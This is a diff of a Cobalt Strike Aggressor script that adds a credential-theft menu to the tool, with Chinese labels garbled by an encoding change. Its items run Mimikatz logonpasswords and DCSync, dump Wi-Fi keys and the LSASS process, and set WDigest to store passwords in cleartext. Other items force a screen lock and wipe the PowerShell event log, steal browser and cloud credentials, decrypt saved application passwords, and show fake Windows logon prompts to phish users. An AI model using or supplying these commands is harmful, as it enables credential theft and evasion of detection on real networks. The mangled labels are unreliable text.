@@ -1,4 +1,4 @@
-menu "å¯†ç æŠ“å–" {
+menu "ÃÜÂë×¥È¡" {
 	menu "mimikatz" {
 		item "Mimikatz-logonpasswords" {
 		if(-isadmin $1['@'])
@@ -13,18 +13,18 @@ menu "å¯†ç æŠ“å–" {
 	}
 		 separator();
 		 menu "Mimikatz-DCSync" {
-		 		item "æŒ‡å®šç”¨æˆ·" {
-		 			$dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "åŸŸå" , user => "ç”¨æˆ·") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
-		 			dialog_description($dialog,"ä½¿ç”¨MimikatzåŽ»èŽ·å–æŒ‡å®šç”¨æˆ·çš„å¯†ç Hash");
+		 		item "Ö¸¶¨ÓÃ»§" {
+		 			$dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "ÓòÃû" , user => "ÓÃ»§") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
+		 			dialog_description($dialog,"Ê¹ÓÃMimikatzÈ¥»ñÈ¡Ö¸¶¨ÓÃ»§µÄÃÜÂëHash");
 		 			drow_text($dialog,"bid","Bid:");
 		 			drow_text($dialog,"domain","Domain:");
 		 			drow_text($dialog,"user","User:");
 		 			dbutton_action($dialog,"Exploit");
 		 			dialog_show($dialog);
  		 		}
-		 		item "å…¨éƒ¨ç”¨æˆ·" {
-		 			$dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "åŸŸå") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
-		 			dialog_description($dialog, "èŽ·å–å…¨éƒ¨ç”¨æˆ·çš„å¯†ç Hash");
+		 		item "È«²¿ÓÃ»§" {
+		 			$dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "ÓòÃû") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
+		 			dialog_description($dialog, "»ñÈ¡È«²¿ÓÃ»§µÄÃÜÂëHash");
 		 			drow_text($dialog, "domain","Domain:");
 		 			dbutton_action($dialog,"Exploit");
 		 			dialog_show($dialog);
@@ -121,41 +121,41 @@ menu "å¯†ç æŠ“å–" {
 
 separator();
 
-  menu "æŽ¢æµ‹wifiå¯†ç " {
-    item "èŽ·å–è¿žæŽ¥è¿‡çš„wifi" {
+  menu "Ì½²âwifiÃÜÂë" {
+    item "»ñÈ¡Á¬½Ó¹ýµÄwifi" {
       local('$bid');
       foreach $bid ($1){
         bshell($1, "netsh wlan show profiles");
       }
     }
-    item "èŽ·å–wifiå¯†ç " {
-      prompt_text("è¾“å…¥wifiå: ", "", lambda({
+    item "»ñÈ¡wifiÃÜÂë" {
+      prompt_text("ÊäÈëwifiÃû: ", "", lambda({
         bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
       }, @ids => $1));
     }
-    item "SharpWifiGrabber(æ£€ç´¢Wi-Fiå¯†ç )"{
-      blog($1, "é¡¹ç›®åœ°å€ï¼šhttps://github.com/r3nhat/SharpWifiGrabber")
+    item "SharpWifiGrabber(¼ìË÷Wi-FiÃÜÂë)"{
+      blog($1, "ÏîÄ¿µØÖ·£ºhttps://github.com/r3nhat/SharpWifiGrabber")
       bexecute_assembly($1, script_resource('/modules/HashCat/SharpWifiGrabber.exe'), "");
     }
   }
 
-    menu "ä¿®æ”¹æ³¨å†Œè¡¨dumpæ˜Žæ–‡å¯†ç " {
-    item "æ˜¾ç¤ºæ˜Žæ–‡" {
+    menu "ÐÞ¸Ä×¢²á±ídumpÃ÷ÎÄÃÜÂë" {
+    item "ÏÔÊ¾Ã÷ÎÄ" {
       local('$bid');
       foreach $bid ($1){
         bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
       }
     }
-    item "å¼ºåˆ¶é”å±" {
+    item "Ç¿ÖÆËøÆÁ" {
       local('$bid');
       foreach $bid ($1){
-        blog($1, "æ­£åœ¨æ‰§è¡Œé”å±");
+        blog($1, "ÕýÔÚÖ´ÐÐËøÆÁ");
         bpowershell_import($bid, script_resource("/modules/HashCat/lock-screen.ps1"));
         bpowerpick($bid,"Lock-WorkStation");
         bshell($bid,"wevtutil cl \"Windows PowerShell\"");
       }
     }
-    item "éšè—æ˜Žæ–‡" {
+    item "Òþ²ØÃ÷ÎÄ" {
       local('$bid');
       foreach $bid ($1){
         bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f");
@@ -164,30 +164,30 @@ separator();
   }
 
 
-menu "æå–æµè§ˆå™¨æ•°æ®åŠå¯†ç " {
-    item "BrowserGhost(æå–æµè§ˆå™¨å¯†ç )" {
-      blog($1, "é¡¹ç›®åœ°å€ï¼šhttps://github.com/QAX-A-Team/BrowserGhost")
+menu "ÌáÈ¡ä¯ÀÀÆ÷Êý¾Ý¼°ÃÜÂë" {
+    item "BrowserGhost(ÌáÈ¡ä¯ÀÀÆ÷ÃÜÂë)" {
+      blog($1, "ÏîÄ¿µØÖ·£ºhttps://github.com/QAX-A-Team/BrowserGhost")
       bexecute_assembly($1, script_resource("/modules/HashCat/BrowserGhost.exe"));
     }
 
-    item "SharpChromium(æå–æµè§ˆå™¨æ•°æ®)" {
+    item "SharpChromium(ÌáÈ¡ä¯ÀÀÆ÷Êý¾Ý)" {
       $bid = $1['@'];
       $dialog = dialog("SharpChromium", %(bid => $bid), &SharpChromium);
-      dialog_description($dialog,".NET 4.0 CLRé¡¹ç›®ï¼Œç”¨äºŽæ£€ç´¢Chromiumæ•°æ®ï¼Œå¦‚Cookieã€åŽ†å²è®°å½•å’Œä¿å­˜çš„ç™»å½•åã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/djhohnstein/SharpChromium");
+      dialog_description($dialog,".NET 4.0 CLRÏîÄ¿£¬ÓÃÓÚ¼ìË÷ChromiumÊý¾Ý£¬ÈçCookie¡¢ÀúÊ·¼ÇÂ¼ºÍ±£´æµÄµÇÂ¼Ãû¡£ÏîÄ¿µØÖ·£ºhttps://github.com/djhohnstein/SharpChromium");
       drow_combobox($dialog, "Type", "all/cookies/history/logins", @("all", "cookies","history","logins"));
-      dbutton_action($dialog, "è¿è¡Œ");
+      dbutton_action($dialog, "ÔËÐÐ");
       dialog_show($dialog);
     }
     sub SharpChromium {
       bexecute_assembly($bid, script_resource("/modules/HashCat/SharpChromium.exe"), $3['Type']);
     }
 
-    item "SharpWeb(æå–æµè§ˆå™¨æ•°æ®)" {
+    item "SharpWeb(ÌáÈ¡ä¯ÀÀÆ÷Êý¾Ý)" {
       $bid = $1['@'];
       $dialog = dialog("SharpChromium", %(bid => $bid), &SharpWeb);
-      dialog_description($dialog,"å¯ä»ŽGoogle Chromeï¼ŒMozilla Firefoxå’ŒMicrosoft Internet Explorer/Edgeæ£€ç´¢ä¿å­˜çš„æµè§ˆå™¨å‡­æ®ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/djhohnstein/SharpWeb");
+      dialog_description($dialog,"¿É´ÓGoogle Chrome£¬Mozilla FirefoxºÍMicrosoft Internet Explorer/Edge¼ìË÷±£´æµÄä¯ÀÀÆ÷Æ¾¾Ý¡£ÏîÄ¿µØÖ·£ºhttps://github.com/djhohnstein/SharpWeb");
       drow_combobox($dialog, "Type", "all/chrome/firefox/edge", @("all", "chrome","firefox","edge"));
-      dbutton_action($dialog, "è¿è¡Œ");
+      dbutton_action($dialog, "ÔËÐÐ");
       dialog_show($dialog);
     }
     sub SharpWeb {
@@ -195,13 +195,13 @@ menu "æå–æµè§ˆå™¨æ•°æ®åŠå¯†ç " {
     }
   }
 
-    menu "æœ¬åœ°ç¨‹åºæ–‡ä»¶å¯†ç è§£å¯†" {
-    item "SharpCloud(èŽ·å–äº‘å‡­è¯)" {
+    menu "±¾µØ³ÌÐòÎÄ¼þÃÜÂë½âÃÜ" {
+    item "SharpCloud(»ñÈ¡ÔÆÆ¾Ö¤)" {
       $bid = $1['@'];
-      $dialog = dialog("èŽ·å–äº‘å‡­è¯", %(bid => $bid), &SharpCloud);
-      dialog_description($dialog, "ç”¨äºŽæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸ŽAWSï¼ŒMicrosoft Azureå’ŒGoogle Computeç›¸å…³çš„å‡­è¯æ–‡ä»¶ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/chrismaddalena/SharpCloud");
+      $dialog = dialog("»ñÈ¡ÔÆÆ¾Ö¤", %(bid => $bid), &SharpCloud);
+      dialog_description($dialog, "ÓÃÓÚ¼ì²éÊÇ·ñ´æÔÚÓëAWS£¬Microsoft AzureºÍGoogle ComputeÏà¹ØµÄÆ¾Ö¤ÎÄ¼þ¡£ÏîÄ¿µØÖ·£ºhttps://github.com/chrismaddalena/SharpCloud");
       drow_combobox($dialog, "type", "type:", @("all","aws","azure","gcloud"));
-      dbutton_action($dialog, "è¿è¡Œ");
+      dbutton_action($dialog, "ÔËÐÐ");
       dialog_show($dialog);
     }
     sub SharpCloud {
@@ -212,18 +212,18 @@ menu "æå–æµè§ˆå™¨æ•°æ®åŠå¯†ç " {
       item "SharpDecryptPwd" {
         $bid = $1['@'];
         $dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &SharpDecryptPwd);
-        dialog_description($dialog,"å¯¹å¯†ç å·²ä¿å­˜åœ¨Windwosç³»ç»Ÿä¸Šçš„éƒ¨åˆ†ç¨‹åºè¿›è¡Œè§£æž,åŒ…æ‹¬ï¼šNavicat,TeamViewer,FileZilla,WinSCP,Xmangagerç³»åˆ—äº§å“ï¼ˆXshell,Xftp)ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/SharpDecryptPwd");
+        dialog_description($dialog,"¶ÔÃÜÂëÒÑ±£´æÔÚWindwosÏµÍ³ÉÏµÄ²¿·Ö³ÌÐò½øÐÐ½âÎö,°üÀ¨£ºNavicat,TeamViewer,FileZilla,WinSCP,XmangagerÏµÁÐ²úÆ·£¨Xshell,Xftp)¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/SharpDecryptPwd");
         drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla","-WinSCP"));
-        dbutton_action($dialog, "è¿è¡Œ");
+        dbutton_action($dialog, "ÔËÐÐ");
         dialog_show($dialog);
       }
       item "Xmangager" {
         $bid = $1['@'];
         $dialog = dialog("Xmangager", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager);
-        dialog_description($dialog, "Xmangagerç³»åˆ—äº§å“ï¼Œå¦‚ï¼šXshell,Xftpã€‚");
+        dialog_description($dialog, "XmangagerÏµÁÐ²úÆ·£¬Èç£ºXshell,Xftp¡£");
         drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
         drow_text($dialog, "path", "Sessions Path:  ");
-        dbutton_action($dialog, "è¿è¡Œ");
+        dbutton_action($dialog, "ÔËÐÐ");
         dialog_show($dialog);
       }
     }
@@ -239,18 +239,18 @@ menu "æå–æµè§ˆå™¨æ•°æ®åŠå¯†ç " {
       item "SharpDecryptPwd40" {
         $bid = $1['@'];
         $dialog = dialog("SharpDecryptPwd40", %(type => "-Navicat",bid => $bid), &SharpDecryptPwd40);
-        dialog_description($dialog,"ç›®å‰æ”¯æŒ Navicat ç³»åˆ—ã€Xmanager ç³»åˆ—ã€TeamViewerã€FileZilla å®¢æˆ·ç«¯ã€Foxmailã€RealVNC æœåŠ¡ç«¯ã€TortoiseSVNã€WinSCPã€Chrome å…¨ç‰ˆæœ¬ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/RcoIl/SharpDecryptPwd");
+        dialog_description($dialog,"Ä¿Ç°Ö§³Ö Navicat ÏµÁÐ¡¢Xmanager ÏµÁÐ¡¢TeamViewer¡¢FileZilla ¿Í»§¶Ë¡¢Foxmail¡¢RealVNC ·þÎñ¶Ë¡¢TortoiseSVN¡¢WinSCP¡¢Chrome È«°æ±¾¡£ÏîÄ¿µØÖ·£ºhttps://github.com/RcoIl/SharpDecryptPwd");
         drow_combobox($dialog, "type", "Type:", @("-Navicat", "-TeamViewer", "-FileZilla","-WinSCP","-Foxmail","-RealVNC","-TortoiseSVN","-Chrome"));
-        dbutton_action($dialog, "è¿è¡Œ");
+        dbutton_action($dialog, "ÔËÐÐ");
         dialog_show($dialog);
       }
       item "Xmangager40" {
         $bid = $1['@'];
         $dialog = dialog("Xmangager", %(type => "-Xmanager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager40);
-        dialog_description($dialog, "Xmangagerç³»åˆ—äº§å“ï¼Œå¦‚ï¼šXshell,Xftpã€‚");
+        dialog_description($dialog, "XmangagerÏµÁÐ²úÆ·£¬Èç£ºXshell,Xftp¡£");
         drow_combobox($dialog, "type", "Type:", @("-Xmanager"));
         drow_text($dialog, "path", "Sessions Path:  ");
-        dbutton_action($dialog, "è¿è¡Œ");
+        dbutton_action($dialog, "ÔËÐÐ");
         dialog_show($dialog);
       }
     }
@@ -263,16 +263,16 @@ menu "æå–æµè§ˆå™¨æ•°æ®åŠå¯†ç " {
     }
   }
 
-item "Net-GPPPassword(ç»„ç­–ç•¥å¸æˆ·å‡­æ®)" {
-    blog($1, ".NETå®žçŽ°çš„Get-GPPPasswordã€‚æ£€ç´¢é€šè¿‡ç»„ç­–ç•¥é¦–é€‰é¡¹æŽ¨é€çš„å¸æˆ·çš„æ˜Žæ–‡å¯†ç å’Œå…¶ä»–ä¿¡æ¯ã€‚è¯¥æŠ€æœ¯å¾ˆæ—§ï¼Œä½†æ˜¯åœ¨å¾ˆæ—©ä»¥å‰åˆ›å»ºåŸŸçš„çŽ¯å¢ƒä¸­ä»ç„¶å¾ˆæœ‰ç”¨ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/outflanknl/Net-GPPPassword")
+item "Net-GPPPassword(×é²ßÂÔÕÊ»§Æ¾¾Ý)" {
+    blog($1, ".NETÊµÏÖµÄGet-GPPPassword¡£¼ìË÷Í¨¹ý×é²ßÂÔÊ×Ñ¡ÏîÍÆËÍµÄÕÊ»§µÄÃ÷ÎÄÃÜÂëºÍÆäËûÐÅÏ¢¡£¸Ã¼¼ÊõºÜ¾É£¬µ«ÊÇÔÚºÜÔçÒÔÇ°´´½¨ÓòµÄ»·¾³ÖÐÈÔÈ»ºÜÓÐÓÃ¡£ÏîÄ¿µØÖ·£ºhttps://github.com/outflanknl/Net-GPPPassword")
     bexecute_assembly($1, script_resource("/modules/HashCat/Net-GPPPassword_dotNET_v2.exe"), "");
   }
 
-menu "é’“é±¼å¯†ç çªƒå–" {
+menu "µöÓãÃÜÂëÇÔÈ¡" {
  	item "FakeTheScreen" {
 		$dialog = dialog("QAQ",%(bid => $1["@"] , os => "Win7") ,&FakerScreen);
 		dialog_description($dialog,"QAQ");
-		drow_combobox($dialog,"os","ç³»ç»Ÿ:",@("Win7","Win10"));
+		drow_combobox($dialog,"os","ÏµÍ³:",@("Win7","Win10"));
 		dbutton_action($dialog,"Exploit");
 		dialog_show($dialog);
 	}
@@ -286,12 +286,12 @@ sub FakerScreen {
 		bexecute_assembly($3["bid"],script_resource("./modules/HashCat/fakelogonscreen_trunk/FakeLogonScreen.exe"));
 	}
 }
-    item "CredPhisher(è®¤è¯ç™»å½•æ¡†é’“é±¼)" {
+    item "CredPhisher(ÈÏÖ¤µÇÂ¼¿òµöÓã)" {
       $bid = $1['@'];
-      $dialog = dialog("CredPhisher", %(content => "å®‰å…¨è®¤è¯",bid => $bid), &CredPhisher);
-      dialog_description($dialog, "å¼¹å‡ºå®‰å…¨è®¤è¯ç™»å½•æ¡†ï¼Œè¿›è¡Œé’“é±¼ã€‚windows10æµ‹è¯•æˆåŠŸã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher");
+      $dialog = dialog("CredPhisher", %(content => "°²È«ÈÏÖ¤",bid => $bid), &CredPhisher);
+      dialog_description($dialog, "µ¯³ö°²È«ÈÏÖ¤µÇÂ¼¿ò£¬½øÐÐµöÓã¡£windows10²âÊÔ³É¹¦¡£ÏîÄ¿µØÖ·£ºhttps://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher");
       drow_text($dialog, "content", "content:");
-      dbutton_action($dialog, "è¿è¡Œ");
+      dbutton_action($dialog, "ÔËÐÐ");
       dialog_show($dialog);
     }
     sub CredPhisher {
@@ -322,7 +322,7 @@ sub FakerScreen {
 	}
   item "DumpLsassMemory"{
       $dialog = dialog("QAQ",%(bid => $1["@"] , pid => "1024") ,&DumpLsassMemorys);
-    dialog_description($dialog,"è¯·è¾“å…¥Lsass's pid");
+    dialog_description($dialog,"ÇëÊäÈëLsass's pid");
     drow_text($dialog,"pid","pid:");
     dbutton_action($dialog,"Exploit");
     dialog_show($dialog);
